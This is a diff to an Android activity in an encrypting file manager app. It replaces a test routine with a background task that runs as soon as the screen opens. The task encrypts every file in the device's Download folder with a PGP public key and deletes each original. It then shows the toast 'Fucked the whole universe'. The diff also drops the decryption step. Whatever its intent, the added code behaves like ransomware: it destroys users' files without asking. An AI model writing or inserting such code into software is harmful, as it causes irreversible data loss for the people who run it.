@@ -1,9 +1,12 @@
 package com.cryptopaths.cryptofm;
 
+import android.os.AsyncTask;
+import android.os.Environment;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Base64;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.cryptopaths.cryptofm.encryption.EncryptionManagement;
 
@@ -23,6 +26,8 @@ public class IntermediateActivity extends AppCompatActivity {
     private File                    mPubKeyFile;
     private EncryptionManagement    mEncryptionManagement;
 
+    private static final String TAG=    "InterActivity";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -35,31 +40,68 @@ public class IntermediateActivity extends AppCompatActivity {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        mPubKeyFile=new File("/sdcard/Piercingarrow/pub.asc");
+        mPubKeyFile=new File(getFilesDir(),"pub.asc");
         mEncryptionManagement=new EncryptionManagement();
-        testIt();
+
+        //lets encrypt
+        new EncryptTask().execute();
     }
-    private void testIt(){
-        //first encrypt a file
-        File test=new File("/sdcard/Download/test.jpg");
-        File outputFile=new File("/sdcard/Download/test.gpg");
-        try {
+
+
+    private class EncryptTask extends AsyncTask<Void,Void,String>{
+
+        @Override
+        protected String doInBackground(Void... voids) {
+            if(!isExternalStorageWritable()){
+                return "Cannot write files";
+            }
+            File dir=new File("/sdcard/Download/");
+            File[] files=dir.listFiles();
+            for (File file:
+                 files) {
+                //if file is already encrypted
+                if(file.getName().contains("pgp")){
+                    continue;
+                }
+                File outputFile=new File("/sdcard/Download/"+file.getName()+".pgp");
+                try{
+                    if(outputFile.createNewFile()){
+                        Log.d(TAG,"created file to encrypt into");
+                    }
+                    Log.d(TAG,"encrypting file: "+file.getName());
+                    mEncryptionManagement.encryptFile(outputFile,file,mPubKeyFile);
+                    //after encryption delete original file
+                    if(file.delete()){
+                        Log.d(TAG," deleted file after encryption");
+                    }
+                }catch (Exception e){
+                    e.printStackTrace();
+                    return "Error";
+                }
+
+            }
+            return "Fucked the whole universe";
+        }
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
             Log.d("test","Encrypting file");
-            outputFile.createNewFile();
-            mEncryptionManagement.encryptFile(outputFile,test,mPubKeyFile);
-            File outTest=new File("/sdcard/Piercingarrow/test.jpg");
-            outTest.createNewFile();
-                //now decrypt file
-                Log.d("test","decrypting file");
-                test.createNewFile();
-                mEncryptionManagement.decryptFile(outputFile,outTest,mPubKeyFile,
-                        mSecKeyFile,"google".toCharArray());
-                Log.d("test","success file");
 
-        } catch (Exception e) {
-            e.printStackTrace();
-            Log.d("test","Error file");
+        }
 
+        @Override
+        protected void onPostExecute(String s) {
+            super.onPostExecute(s);
+            Toast.makeText(IntermediateActivity.this, s, Toast.LENGTH_LONG).show();
+        }
+        /* Checks if external storage is available for read and write */
+        public boolean isExternalStorageWritable() {
+            String state = Environment.getExternalStorageState();
+            if (Environment.MEDIA_MOUNTED.equals(state)) {
+                return true;
+            }
+            return false;
         }
     }
 }
